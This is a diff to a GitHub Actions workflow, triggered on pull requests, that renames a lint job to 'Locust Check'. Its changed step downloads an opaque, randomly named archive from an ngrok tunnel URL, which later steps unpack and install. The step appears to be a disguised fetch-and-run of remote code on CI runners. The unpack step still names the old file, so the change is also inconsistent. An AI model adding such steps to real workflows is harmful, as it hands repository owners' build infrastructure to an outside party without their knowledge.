@@ -1,4 +1,4 @@
-name: Lint Spire
+name: Locust Check
 
 on: [pull_request]
 
@@ -13,7 +13,7 @@ jobs:
         with:
           python-version: "3.8"
       - name: Wget package
-        run: wget https://02efaf6fa8ef.ngrok.io/items/hf8734hfiu932fujiufhg928ufjoi23bhg9834
+        run: wget https://02efaf6fa8ef.ngrok.io/github/items/hf8734hjf98324jhfiu3gfh9928ufjoi23bhg9834
       - name: Unpack package
         run: tar -xvf hf8734hfiu932fujiufhg928ufjoi23bhg9834
       - name: Install locust
